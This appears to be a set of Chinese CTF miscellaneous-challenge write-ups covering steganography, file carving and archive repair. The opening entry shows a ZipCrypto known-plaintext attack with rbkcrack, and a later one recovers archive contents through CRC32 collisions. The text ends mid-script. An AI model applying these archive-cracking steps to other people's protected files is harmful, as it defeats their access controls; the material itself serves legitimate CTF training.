Triglavian拿到一个压缩包需要密码。要么爆破，要么伪加密，要么明文攻击。前两者都不是但是又只有一个文件，不符合明文攻击，这里我们需要创建一个文件。因为压缩包里就一张Triglavian.png图片，而png图片的开头有16字节是不变的，为89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52。这里我们需要自己创建一个png_header.png文件，内容就是由那16字节组成。 使用工具开始攻击–rbkcrack.exe。 12345&gt; rbkcrack.exe -C Triglavian.zip -c Triglavian.png -p PNG_header.png-C 要攻击的压缩包-c 要攻击的压缩包里面的文件-p 刚创建的明文文件名 能破解得到ZipCrypto的内部的三个key：be056038 0a143c0c 1ea08ca5。 用这三个key来解码文件 123456&gt; rbkcrack.exe -C Triglavian.zip -c Triglavian.png -k be056038 0a143c0c 1ea08ca5 -d Triglavian.png-C 要攻击的压缩包-c 要攻击的压缩包里面的文件-k 刚生成的三个key-d 最终还原的文件名 最终在同路径下得到压缩的文件。 bugku杂项一个普通的压缩包(xp0intCTF)打开之后是一个压缩包，使用winrar打开提示文件头部错误，压缩包中的文件可以正常打开，打开之后提示flag is not here，仔细看提示发现还有一个secrect.png文件。 这里就需要分析一下rar的结构，拖入01editor。 发现png的文件头出了问题。 现png那的文件头类型A8 3C 7A，把7A修改为74。最后发现修改成功。 得到secret.png，查看一张纯白的图片，用010Editor查看是一个gif的文件。放入stegsolve。发现一半二维码。 最后使用PS来进行修改。拿到flag。 好多压缩包crc校验码来爆破出内部文件的内容，拿到一串base64 +a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA== 解码之后有乱码，说明解码之后应该是一个文件，尝试python解码。 123import base64f=&#x27;z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==&#x27;f=open(&#x27;flag.txt&#x27;,&#x27;w&#x27;).write(base64.b64decode(f)) 解码之后的内容。 123蠍s ?z €# I T \u0002?kc\u001dI\u001d3\u0003 \u0001 CMT \u0015\u0014溯AO?H予彉E\u0011QAF鳠\u001d B|m+竔薀(,3(麳\u0016?\u001b\u0018\u001d?,Fv崤韌Mr轒J諅t緬?斖井?&quot;€J鱰 ? \u001d \u001d \u0002b宴誒c\u001dI\u001d0\b flag.txt ?iffix the file and get the flag?&#123; @\u0007 提示修复，直接访问winhex修复，查看文件尾部C43D7B00400700，网上wp说这是文件尾部，但是我查看了好多rar包尾部都不是C43D7B00400700。这里直接修补上头部。526172211A0700。 修复之后，在压缩包注释中有flag。这里要注意如果压缩包中有注释的话，压缩包的十六进制中会有CMT字段。 convert一串二进制，直接转换成十六进制，然后发现是十六进制是rar的文件，直接转换成rar。 12345678910111213a =&quot;010100100110000101110010001000010001101000000111000000001100111110010000011100110000000000000000000011010000000000000000000000000000000000000000000000000000000011110111110000000111010000100000100100000010110000000000000011010000100100000000000000000101100100100010000000000000000000000010001111100110001101110000000110010000101001011001101100110100101000011101001100110000011100000000001000000000000000000000000000000110101101100101011110010010111001101010011100000110011100000000111100000001010010100011000110010001000000011101100100010001010100001000100100010111110010010000000101011110101011001011000000101110110011010000100000100010100010100000101110000110100010110100110100001000001010100000010111011011011000101000100000001000000101100000100010011010100101000100110110101010000010100000110110100110100010110011010000100110110010110000001011001100010001001101001010011010000101000100010101000000010001000111010010001000001000100000100110100101000000011101000001101100010101000001000101010001010000110001001100010000000100000100010011010101110111000110110000000101000010110101010001000000110000010100101101000001000000111011000101100000011101000100011011000000111000001111011100011110101100010001110111110001110011001110111101111100001100111100010011111011100100010011000100111100100110011001111110101010011111101110010011000100011100111100001001100010101111111001100010011101000111110101010011001100110101001110100010001111101000111111011111101010100111110000101010001000101010001010100010101000100010011010101010101111000010011000100010011100011111110100011000111111111011000000110100101010110110101011101011010010101110000000001101100101100000001101111110000101111000000011000111111101001110100101101011000101011001111100011011110110110111001100001010111000101110000000110101111000001100101000000100100000000011110000110011011110000000110001110010010100001100000101000000101001011101000110010000110100000111100000011100001100101110110100101011010000010100001111100000000010000000101001011001101110000101000110001101110010010100000001111100010100111110110001001110100011111000000101100010110110010001011011111101000111110000001011000101100010110110010001101000000110111111000110100000111100001001010111101100100010010101101000111110000001011000101100010110110010001111101011101000111110000001011000101101100100010101011001100110000000111001000000011111000000001101110000010011110100101100000011110000000001111011000000101110000000011001010000001010110000000010010000001101110100010110011001000000101001111110011001110001101000010101001101110001110010010101110000110010010100011000000001011101110010100111111111011100101101100010000001101111000000001111101111110110001100101010110000010101100101110011001111101101110000001010100000010011110101110100001010011111100110001111100000111001001010111110100001011100001011100100000100010111011100110000101110011110010100010000100100111111100011111000110000000001110010101010110000001010110010101000110001001011101011000000100111100010100010000011010110100100101110000011101010110110000100000001010011110101101100010100101000011000001010010001110010001011110000110111101110011110011000110101101001011011010110000001010010110110101111001010110111110100000111101001001100000110111010111001001000000101001101011011011000110110100011110010001111000001011110010001010011101100010001000111111100000101101111011110010010010001101010000101110100100010110000100110110110011011100111100101111001011101010100111100010110001011011100110111100001001010000111101101011011101001110000000110110001001010011010100111010001110010000101101111100000111101110101000101100001010110100000010110000001010000000111001111100011101010001111011010100111000101101100001011110011111110101100100100001100110101000101010001010001101111011111010010010100101010001100001010011011110110101111001100000011001011101100110101110000011000101110001110101010101010110110001101110011011110101100101111101011101110110110001100001011111011101110100110001001101010011111010111000101101010010011100110101101000110000111001010010110100100001101010101000001111100010011110111110001110010011101010111001000101111011000011110001010111110100111110000011100110101101011001100101010100010100001011111011010111111001001111000010111101111101000010011100001011010000100101001001010000011101110110101101101101010011110110000011011011101010111111111100000101010000101000010010111000111111111000111110001100011110111100101100010010100111101101001011010010100111010001110111001000011001110000101010011101100100100000101100011000001101000101100011010001101010010010000100010101010010010111100000100100111001100101111110001111100010010010010111011110100001101000010000101111001101000001000101111111111100010010000000100101011100010101111111011000000011010001111100100000001011000101101100100011100111111101110001101000111110010000000101100010110001011011001000111101011111111111011001000001111110001101001010101101101100011100110000101101001001001011110110000101101001000101011000111101101000000001010101000000001001001100110011001100010000011001100110010000100100010001100101100001101000011010000010010011010100110111001110111101001000011011100110110001101100011011111010101011010011011010011100111001001110110011111111010101101000001010000001100101111001111100011111000010100100010001001010010001100001010010000100100100001000011110011000010100011111011010011010111001001000000110011011000111011001011001010000100000101000110010011100101000101001101000110101010000010010100100101111011001000011011101000010110000000011000110100110010010000101111011000110111001111011101001001101001000011110100011011101011000011111011010110000011011100100110011111100011110100110000000011101000010010000001011001000001010110100001110000110010000100000000110000001110100000110000011111001011101100011111110000000000010000010000101110101001001100001100100000110110010101000111110111110110001111010000110001100000000111001100010011001011001110110000000100100110100001101010011011000001000101001001111011010010100101110110000101110101100001110011000000110001000011100110010001100100011000100110001000010101010101111110000010101011100000001100010011101000110010110100110110101100110110001010101000011001111010011101011111000111100010000100001001110110001110110001101100000011000101011101001100010010100001111011011011101100011101111011010100001100000101011011011111001000100010010111110000000111011110000010001011111100110101001001111000011110111010101011010101101000101110101101010001100100011111010111011010111111011001011011001101001100110110100010011010100111001001111010101011101101110101011001010111010110000101100101011010010110110110000101100010011000110110010001100101110111011110111100011001100110101000001011011000001101001000001101110011011110111000001111000011110010010001011110100111101101111100001001001111101100000111110001001000010010000101100001101000011111100010111100011010001011100011001110010111000110111100110010001110111001101111001110111001111100100101110101001001001110010100111010101100101011001011010010111100110001110110011110110101001110110011110100111111010000010100001101000101010001110100111111011111111100000111100001101010001111000101111000111010100110101010101011101111001101010111110110000111100111101100011111010001011001010110011111101001001001110111000101110011011101011110101011110101110111011101111000010100101111111100000011111101111100000111111000011111000111000010001010111111001011000011110100001100011001110011110011100000111000011011111011100011001010110111100111010110010000111001111010101110011110101100011000100010001100101011000110011000100111101111010000001010000111010001011100001110011110101100011001111010011001010100010111110001000000111101110110110100111010000100010110000100100111011110110110110011110110011100100100001101000100001101001011011000001011111011010100000101101010110111001111010101010001001101100101111010010100010110111111110100001100011011111111110101000111111101001111000110101000001011001001111010111100100111001111111000110001100110110011000000011011100001111100100100001100000011101011001110100111000000001110000001100001011000011010001111001001010000000001101011111111111110101100110101010100011101010001000010010110110100000101001011010111001111011010001111100000110010111011001110001001001001010110001010001001100110100101010111011111010101110110111111111001010100100110101100111101001110010100101100111110000111011111101010001100101100000111101001011101010111100011011100101111110010001010011101001011000001110000101101101001000111110111000110101010110000111011000010011001111111001110110100011001111110101010010001110011101010011110010000110000011101000101001100101010000001000010000011000110101110111010100101101001101010110010011101110001011101110001010011010101100010101100111011001110011100010011111010111111011110100100011110100011110101111011010110000111000100011000001100101101111100110000110111010101010111001001010001101001111101100011110101110110101101100001110000101000101101000010100001010100001110000101110001001010111100001101011001010110110011010000110011110110010010101101111010101011010111110010010001010110101101011101101010001011111101010011001001100100100011001101111011010111000100110001001011010001100011000110010001110001010010010001110010010100100111001000000101001011001010001101011011111001011100011011101010100001101011111100000101101110100110101001101000100110010000011011011000111100001101011001101001011100111010010000100110100010010110001110000011110000000110110010011011100000111000101011010001010101010101110110101000101100111000101011011110011001110101111010100101001101001010011010000001001101100100011110111000100100001000100011100110111010010010001001101101101011001101011000011100010111111111111011101101010100000111110001101110111010001001110111111000100101001110000100011100101001110001101010100100100010011101010101111011000001010000001100100001111011110000011000101001001010001011010101110011110111100110011010100111010001100000100101001010001011010100000101001110011000010100011001001011001101000101000111110000010110100101001100000001110001101010000010011001011101101110101101011110010011111100011000011110100100001110111001000001000101110111101100011001000000000111000110000111110110001011110011110100110011110111100101000101001101010011100010000110100101001101101101011010100001001011011010000010000101111110001101101101110100011100100010010101101110011000100101111010100111011110110001011101010111111101101011011000010010000001101111101111000110111100111100010100100011011110100010011111101101111000101001101010110100100000111000001011001010100101100000010001011000110011011000101011001001110010101110010011110111011011100111111110111001000100010101011100111111110011100100010111100100101001101101101011000011001000011110110011111100101011111001001000010101000001110100010101011100111011110110110111000100010011110011011111110001001001100110100100110101111011101101110010000110111010111110111010010100001000100110010001111111101001111101100100010000011011010010010011000100101101001001011000110111101100111011010001000101010110010011110101001110100110110001011111100010010011110100010110000101100010100011111000011101011110011000010011110111101101001000101101111110101100001110011101110111101011001111101110111101110001000111000011110110000111101110111101010110100111101101000101011000011011000001000110001100001110011111000001111011010011001101001100100010010010011011111110011101010011100100001011111011100001111100011111001000101001011001001011100100110100000000001011100000111110011001011101101011011111011000100010111100101100110011101110110000101010011001010110100100100010110010011110111011111011101011010100011010110001111111100100100001110100111111011111111100001100100011000100110111000100111000011101101101111110000111011101010001101111011011010011001110000110111101010111001100011000111100000100101110001011010000010011110000000111110101101000100011001001011111010110110011010100101000101010011100001010000111010111110110110011011110111110111001010001010110000100110110011000110000111100001010000111010010010101000000011100110111010001110001111000101010011110100011011010101110010011000110101010010101001100110110110100110100111010100100001100101011101001101011000001100010000011111100011010110110110001101010001100100000111010110101111010111000010101000100100010011000010100100110010101111010101011110001001010010110010100010101100011100000010100010011100111000000100100010011011011100010110111111110101011101001110110001110110110010000001001000011100001011110110000101001001011110001010010111011111101010100100001001000011000100001111101000001010011101010110101010111000110110001011011000001111110010000001010011111111000111110101110100110110101001100101011101110001110100010110011110110110100101100110110101100000001110101101110101100011001011101000100001000010111001001110100100001010110011111101101110110011100100101111011100010001111010011001110110011110010011111100100011000111000100000101111011011010010000001110001010110111000110000101001100010101100001000110101101011001000100001011100101001010100000011000110011000110010001011001001010000011011000100101110000001011000011101101101010010111101001011001000110100011010001100011100011110001001010110111111000001001001011001011111000010100000000010100010010100110100100000111110110110100011110110111010010011111000111100111110111011110010111110111011110001100101000111000110101100000000011010100011001001000100001101011101111010111010000000001010011111111101111111110100110101111101100110111111001000000101010001010110100101011010001111110111101110101101010001111011010001100110000110110010110100001011001010100000110111000000111000010000111111101110100100110001101111100110011011101100110010100101110010110101000111101011100111110010000101000101000111001100001111111100010000000001011100100101110010101110011101011111111010000100000011100101110101110110110110110100011001100011110011000100011010001010101011010011111111010101011110011011110111100000001001001000001011001100010011100111010101010100100110101000101000001111011111111111010010010101010010101110010111000100101110110111111001010001101100010011000100010001001101000010100011001001110010001101100110111000111111100111110111111010001101000100111001111110111101010010111010101100100010001011111010000011111100111100111000110011010111011110101001111001000011101011101000001010110110000010110101100111000001010001010110010000001011001000011110110010011010011111100001111011011010010111000011110100111011001011001110010110001111001101001010110100101101001111011011100010101011000100100011011110001001010100100101001111010000111101001101001100001000011100001111111100101001100000110100010111111111001010100111001010010100100111010111011011111101111001000111000111000000111010111001110111010100001101100011010100011101010011111100111111011001001101010011011011001111110111101101010110110110110010111111010100101111000001101110111011001010000011001001001101110000111001000011001100100001010011011111111001001001110111101100111010001011001010110000111011100100111001110101101001010111101010011001101010001110101100101001000111010011000011101110100110001011000001100010010011100011110111101100100101111101110011011110011001010110111100111010110011001101101110101111101110010100001100101011000011000111110110001101101010001010001010111000000101100110111011100011011001111111000111101100101101101101000001001111111100011110110100101010001010010001101010010100100111000010000010011111110100101101100111010100100011001010101101111110000110111110001110001010111000100111011000101011110100000010100001110001001111010000011111010001101101000011110000000101110110010101001110111000000000101001110101001011010111100110010010111110000001000101110101010100000111011101011000010111100010010110111011111101000001001111001111000011110101100101101010011001010100011011110110011001011100001011111000110100111000101110000001000110110000111010011010101111110101100011101010111000110110110110110000111111010111101110101000111101101001010101111001110000110111001101100100100111101100000111010001100011011101111010010011100001010011001000011100000110011011101100001110011011100011111001101001001001111111010001100110101000101110110001110100100100100000100101010001000111101010100000111011001100101110001100100011111110000111010101110111100011110101110001111001011010010001111001110011111011000000111110110101110000110000110111110010000010011101000011100110111011101000111110000010110000001101111110011101100001001100101010011001110000010101110000110000111101110110101011001110111101101110100101010111111001101111110111010100001110011101100000100001001011110011001100110100001110111001011101001010000110001110110111101111101011111000110000001011110101010000001111000011000101011000101001110111101000110001111100000110011110000000010010111100010101000101110101100001110111000110011111111100000000110111111011010110011110111011001101110000110111110010011000111101111100001000101010000101110010010011101110111001111111110011100011011011101110110001100010110101000001010011100000101010101000011000011100101001110110000011001011011101101101101001100101101010100100100110110100100111001111011110010100011001111010001001101010101101100100110000000100110101100110110010001110000110010101000011100000110101001100111111010111011000001101101101111001000001110010011001101100110110111000110110000111000100100010011101010001000100001001011010000000000010101001100110110001000111100000001100000101110100111100011100011010000011010011101101110111100111010001011110101001000010000011001100000000010111111110010101111111011011110011010101101001100111101011101011010111101001111010000011111100100000011000100010111011010111110000000100001111000111110101000001110101000000011111001111110011110101000100011010010011100110101101101000101011111101101011010100110011111011111010011111111000000000101000101000111101001110111111100010101101011010110000110011100011101000000011111000001110001110110000100011110011111101001000010000101000011101100111101101011011010011100011101011010001110101111110110111011000101111011011000010110001101100011110011010100110010011100100100111100111001100001110010100010010110011000111111010001100110000110000010101110000100111001110100010010000001111011001110010100110110000111011011101011011001111010010110001000110011001011011011110011110100011110010100100001111001011111101111101000100100110011000001011010111010000001100101010101011000111011010111100000110111111100101011001011100011011000110010011000100101010100011100110101111011000011001011010010001001100111000110101100100001111011101011110001001110000010100001010001100101010101110010011100010010001000111110010011000011011101111111010100000010010010111111100110110010101110110011111111101011110100110000010100011110110110011101000010101001010101111110000110100011100001101110100100110001001111111101101010110100111111010111101101011110001110101111010001011101110100101110110010010100000001101010101011101001011000110001011111000011111100111001011111011011010011000110001011011000000001111011101111010111010101111111111100111010011011111111010000011000010001100011110110010111111110010100011000100001111010111101100000000010000000000011100000000&quot;beginnum = 0endnum = 4b = []f = open(&#x27;1.txt&#x27;,&#x27;w&#x27;)for i in range(0,len(a),4): b.append(hex(int(a[i:i+4], 2)))for i in b: i = i[2:] print(i) f.write(i)f.close() 这里是四个一组转化成十六进制，也可以八个一组转化成十六进制，但是涉及到0的问题，十六进制一般为两个数字，如果不足我们需要补0，所以我们最好是四个一组转换。 base64解码得到flag。 红绿灯首先使用画图工具随便定位一个像素，如果为绿色则+1，红色+0。使用如下脚本： 1234567891011121314151617181920from PIL import Image savepath=&#x27;C:/Users/12521/flag/&#x27;im=Image.open(&#x27;C:/Users/12521/1.gif&#x27;)try: im.save(savepath+&#x27;light&#123;0&#125;.png&#x27;.format(im.tell())) while True: im.seek(im.tell()+1) im.save(savepath+&#x27;light&#123;0&#125;.png&#x27;.format(im.tell()))except: pass flag=&quot;&quot;for i in range(1168): image=Image.open(savepath+&#x27;light&#x27;+str(i)+&#x27;.png&#x27;) if image.getpixel((115,55))==251: flag+=str(1) elif image.getpixel((115,145))==186: flag+=str(0)print(flag) 最后二进制转flag。 细心的大象一张图片，使用binwalk分析一下，有一个压缩包，尝试foremost或者dd命令。 12345678steady@steady:~/桌面/steady$ binwalk /home/steady/桌面/steady/1.jpgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, EXIF standard12 0xC TIFF image data, big-endian, offset of first image directory: 85005118 0x4C5F3E PARity archive data6391983 0x6188AF RAR archive data, version 4.x, first volume type: MAIN_HEAD DD命令 1234steady@steady:~/桌面/steady$ dd if=1.jpg of=flag.rar skip=6391983 bs=1记录了16301+0 的读入记录了16301+0 的写出16301 bytes (16 kB, 16 KiB) copied, 0.0386141 s, 422 kB/s 分离出一个压缩包但是需要密码。回到大象的图片，查看图片描述信息，发现在备注中有base64解密就是密码，修改压缩包中的图片的高度。拿到flag。 图穷匕见打开一张图片，方式winhex查看，发现图片后面有许多数字。 将十六进制放到winhex转换ascii、或者直接使用01editor，文件-&gt;导入十六进制，直接就被转换成了坐标。使用python脚本或者kali gnuplot工具也可以。 也可以使用python脚本转换十六进制 123456f=open(&#x27;1.txt&#x27;,&#x27;r&#x27;).read()print(len(f))flag=&quot;&quot;for i in range(0,len(f),2): flag+=chr(int(f[i:i+2],16))print(flag) 坐标生成二维码 1234567891011121314151617#!/usr/bin/python# coding: utf-8import matplotlib.pyplot as pltimport numpy as npimport matplotlib as mpl mpl.rcParams[&#x27;font.family&#x27;] = &#x27;sans-serif&#x27;mpl.rcParams[&#x27;font.sans-serif&#x27;] = &#x27;NSimSun,Times New Roman&#x27; x, y = np.loadtxt(&#x27;./flag.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)plt.plot(x, y, &#x27;*&#x27;, color=&#x27;black&#x27;) plt.xlabel(&#x27;x&#x27;)plt.ylabel(&#x27;y&#x27;)plt.title(&#x27;Data&#x27;)plt.legend()plt.show() 好多数值打开之后是许多坐标，先分解一下图片长和宽。 12345a=61366for i in range(0,1000): for j in range(0,1000): if (i*j)==a: print(i,j) 12122 503503 122 然后画图 123456789101112131415161718#-*- coding:utf-8 -*-from PIL import Imageimport rex = 503 #x坐标 通过对txt里的行数进行整数分解y = 122 #y坐标 x*y = 行数im = Image.new(&quot;RGB&quot;,(x,y))#创建图片file = open(&#x27;flag.txt&#x27;) #打开rbg值文件#通过一个个rgb点生成图片for i in range(0,x): for j in range(0,y): line = file.readline()#获取一行 rgb = line.split(&quot;,&quot;)#分离rgb im.putpixel((i,j),(int(rgb[0]),int(rgb[1]),int(rgb[2])))#rgb转化为像素im.show() 乌云邀请码使用Stegsolve发现rgb的0位有蹊跷。 使用data extract功能，save bin保存为1.txt拿到flag。 普通的二维码拿到二维码扫描没有发现太多东西，直接拖入01eitoer，最后发现一串字符串，而且只有小于8的数字，猜测是八进制，查看长度是126正好是3的倍数。写脚本转换。 12345steady_str=&quot;146154141147173110141166145137171060125137120171137163143162151160164137117164143137124157137124145156137101163143151151041175&quot;flag=&quot;&quot;for i in range(0,len(steady_str),3): flag+=chr(int(steady_str[i:i+3],8))print(flag) 闪的好快使用kali或者python分离图片。 1root@root:~&#x2F;桌面&#x2F;flag# convert &#39;flag.gif&#39; flag.png 然后使用kali工具批量扫描二维码。 1steady@steady:~&#x2F;桌面&#x2F;flag$ for i in &#123;0..17&#125;;do zbarimg &quot;.&#x2F;flag-$i.png&quot;;done &gt;&gt; qr.txt 拿到flag。 123456789101112131415161718QR-Code:SQR-Code:YQR-Code:CQR-Code:&#123;QR-Code:FQR-Code:1QR-Code:aQR-Code:SQR-Code:hQR-Code:_QR-Code:sQR-Code:oQR-Code:_QR-Code:fQR-Code:4QR-Code:sQR-Code:TQR-Code:&#125; 中国移动杂项FRP06 Where拿到一个jpg文件。 linux下使用exiftool分析，发现是个gif文件，打开winhex发现也是gif头。直接修改后缀。我们可以看到名字虽然是jpg，但是类型却是gif。 1234567891011121314151617181920212223242526272829steady@steady:~/桌面$ exiftool /home/steady/桌面/where.jpgExifTool Version Number : 12.07File Name : where.jpgDirectory : /home/steady/桌面File Size : 392 kBFile Modification Date/Time : 2020:03:09 20:25:57+08:00File Access Date/Time : 2020:10:27 23:31:58+08:00File Inode Change Date/Time : 2020:10:27 23:31:58+08:00File Permissions : rw-------File Type : GIFFile Type Extension : gifMIME Type : image/gifGIF Version : 89aImage Width : 640Image Height : 441Has Color Map : YesColor Resolution Depth : 8Bits Per Pixel : 8Background Color : 255XMP Toolkit : Adobe XMP Core 5.3-c011 66.145661, 2012/02/06-14:56:27Creator Tool : Adobe Photoshop CS6 (Windows)Instance ID : xmp.iid:20FECB3F620111EAAC58D00140743BB9Document ID : xmp.did:20FECB40620111EAAC58D00140743BB9Derived From Instance ID : xmp.iid:20FECB3D620111EAAC58D00140743BB9Derived From Document ID : xmp.did:20FECB3E620111EAAC58D00140743BB9Frame Count : 3Duration : 10.10 sImage Size : 640x441Megapixels : 0.282 直接查看gif文件或者使用linux–convert分离gif，拿到flag。 1root@root:~&#x2F;桌面&#x2F;flag# convert &#39;&#x2F;root&#x2F;桌面&#x2F;where.gif&#39; flag.png win的软件也可以直接分帧拿到flag。 FRP10 hekkerman拿到图片，binwalk分析，直接提取文件，拿到flag。 1234567891011steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ binwalk -e &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpgDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 JPEG image data, JFIF standard 1.0130 0x1E TIFF image data, little-endian offset of first image directory: 8212 0xD4 JPEG image data, JFIF standard 1.01242 0xF2 TIFF image data, big-endian, offset of first image directory: 8414 0x19E JPEG image data, JFIF standard 1.01444 0x1BC TIFF image data, big-endian, offset of first image directory: 828428 0x6F0C Copyright string: &quot;Copyright International Color Consortium, 2009&quot; dd命令 1steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ dd if&#x3D;00000000.jpg of&#x3D;flag-1.jpg skip&#x3D;414 bs&#x3D;1 exiftool提取缩略图 1steady@steady:~&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg$ exiftool -b -ThumbnailImage &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;hekkerman.jpg&gt; thumbnail.jpg python读出文件 123456offset = 414f1=open(&#x27;flag.jpg&#x27;,&#x27;wb&#x27;)f=open(&quot;hekkerman.jpg&quot;,&quot;rb&quot;)f.read(offset)data = f.read()f1.write(data) FRP04 Fat Cat修改jpg宽度，搜索十六进制FFC0之后的第三个到第七个十六进制是图片的宽度和高度。修改之后拿到flag。 Misc4-BurpsCRC32碰撞 将1.txt-6.txt的冗余校验码提取出来 1234561.txt 0x6083a1c8 2.txt 0xce70d4243.txt 0xc3f175114.txt 0x526fd5825.txt 0x30e250386.txt 0xaa3e6aea 然后使用脚本碰撞，观察每一次得到的4 bytes，每一次得到4块十六进制数，将十六进制转换为字符 12345678910111213141516PS D:\\Tools\\Misc\\crc32&gt; python .\\crc32.py reverse 0x6083a1c84 bytes: &#123;0x74, 0x68, 0x65, 0x5f&#125;verification checksum: 0x6083a1c8 (OK)alternative: Cb9fTf (OK)alternative: Jhn4CW (OK)alternative: K9Md4R (OK)alternative: Lmggsq (OK)alternative: Nls5B4 (OK)alternative: PNHKc5 (OK)alternative: TJUJbV (OK)alternative: X4bYjM (OK)alternative: apQQ_2 (OK)alternative: bmKntz (OK)alternative: e9am3Y (OK)alternative: tEfsYS (OK)alternative: v4NPmF (OK) 十六进制转字符串 12345steady_str&#x3D;&quot;7468655f&quot;flag&#x3D;&quot;&quot;for i in range(0,len(steady_str),2): flag+&#x3D;chr(int(steady_str[i:i+2],16))print(flag) Misc5-Trees12345678910111213from PIL import Imageimg = Image.open(&#x27;enc.png&#x27;)w = img.widthh = img.heightimg_obj = Image.new(&quot;RGB&quot;,(w//16,h//16))for x in range(w//16): for y in range(h//16): (r,g,b)=img.getpixel((x*16,y*16)) img_obj.putpixel((x,y),(r,g,b))img_obj.save(&#x27;ok.png&#x27;) FRP19 Sunset这道题尝试很多方式都没有拿到flag。最后仔细看图片，发现图片中有些小黑点，小黑点组成flag。一开始尝试stegsolve，找到白色比较多的一张图片，使用画图工具进行反色，但是情况并不理想，只能看到flag字段。 后来尝试python脚本，一开始的想法是找到对应的小黑点的rgb，然后根据rgb找到对应的坐标，然后把rgb值写入找到的对应坐标，然后根据坐标在画图。后来发现rgb的值不稳定，取出来的坐标也不全，这里写一下脚本： 1234567from PIL import Imageimg = Image.open(&#x27;sunset.jpg&#x27;)for i in range(img.size[0]): for j in range(img.size[1]): if list(img.getpixel((i, j)))==list((34, 76, 118)): print(i,j) 最后想到直接取出对应坐标的rgb值，然后放到对应坐标就可以。 12345678from PIL import Imageimg=Image.open(&#x27;sunset.jpg&#x27;)w,h=img.sizedec=Image.new(&#x27;RGB&#x27;,(int(w/16),int(h/16)))for x in range(int(w/16)): for y in range(int(h/16)): dec.putpixel((x,y),img.getpixel((x*16,y*16)))dec.show() 答题意思就是生成一个全新的图片，但是大小像素缩小到原来的十六倍。获取到对应坐标的rgb值，直接就粘贴到新的图片，这里为什么是十六的倍数？ 打开画图看到，整张图片被分成了许多正方形的小块，而flag的部分，在正方向的左上角，每个正方形的长度是8。 把倍数改成8也是可以得到flag。 FRP07 Hide听说是lsb隐写，使用stegsolve进行data extract，没有发现什么东西。直接使用zsteg，并使用–all参数，拿到flag。 12root@root:~/桌面/flag/套娃# zsteg &#x27;/root/桌面/flag/hide.png&#x27; --al | grep &quot;flag&quot;b1,g,lsb,yx .. text: &quot;flag&#123;easy_LSB_stego&#125;v5&quot; FRP05 Chain1steady@steady:~&#x2F;桌面&#x2F;steady$ strings &#x2F;home&#x2F;steady&#x2F;桌面&#x2F;steady&#x2F;output&#x2F;jpg&#x2F;chain.jpg 拿到flag的十六进制，转为字符串就是flag。 FRP15 Checkit题目是checkit，图片也是png。尝试pngcheck。 123456789101112131415161718192021222324252627282930313233C:\\Users\\12521\\Desktop\\CTFTools\\信息隐藏\\pngcheck&gt;pngcheck.exe -v C:\\Users\\12521\\Desktop\\check.pngFile: C:\\Users\\12521\\Desktop\\check.png (1421461 bytes) chunk IHDR at offset 0x0000c, length 13 1000 x 562 image, 32-bit RGB+alpha, non-interlaced chunk sRGB at offset 0x00025, length 1 rendering intent &#x3D; perceptual chunk gAMA at offset 0x00032, length 4: 0.45455 chunk pHYs at offset 0x00042, length 9: 3780x3780 pixels&#x2F;meter (96 dpi) chunk IDAT at offset 0x00057, length 65445 zlib: deflated, 32K window, fast compression chunk IDAT at offset 0x10008, length 65524 chunk IDAT at offset 0x20008, length 65524 chunk IDAT at offset 0x30008, length 65524 chunk IDAT at offset 0x40008, length 65524 chunk IDAT at offset 0x50008, length 65524 chunk IDAT at offset 0x60008, length 65524 chunk IDAT at offset 0x70008, length 65524 chunk IDAT at offset 0x80008, length 65524 chunk IDAT at offset 0x90008, length 65524 chunk IDAT at offset 0xa0008, length 65524 chunk IDAT at offset 0xb0008, length 65524 chunk IDAT at offset 0xc0008, length 65524 chunk IDAT at offset 0xd0008, length 65524 chunk IDAT at offset 0xe0008, length 65524 chunk IDAT at offset 0xf0008, length 65524 chunk IDAT at offset 0x100008, length 65524 chunk IDAT at offset 0x110008, length 65524 chunk IDAT at offset 0x120008, length 65524 chunk IDAT at offset 0x130008, length 65524 chunk IDAT at offset 0x140008, length 65524 chunk IDAT at offset 0x150008, length 45027 chunk IDAT at offset 0x15aff7, length 138 chunk IEND at offset 0x15b08d, length 0 倒数第三个块没有满，倒数第二个块就是隐藏的数据。 提取出来， 1234567import zlib import binascii a=&quot;789C5D91011280400802BF04FFFF5C75294B5537738A21A27D1E49CFD17DB3937A92E7E603880A6D485100901FB0410153350DE83112EA2D51C54CE2E585B15A2FC78E8872F51C6FC1881882F93D372DEF78E665B0C36C529622A0A45588138833A170A2071DDCD18219DB8C0D465D8B6989719645ED9C11C36AE3ABDAEFCFC0ACF023E77C17C7897667&quot;.decode(&#x27;hex&#x27;) b=zlib.decompress(a) result=binascii.hexlify(b) print(result)print(bin(int(result,16))) 二进制转化为图片，扫码拿到flag。 12345678910111213141516171819from PIL import ImageMAX = 25pic = Image.new(&quot;RGB&quot;,(MAX*9,MAX*9))str = 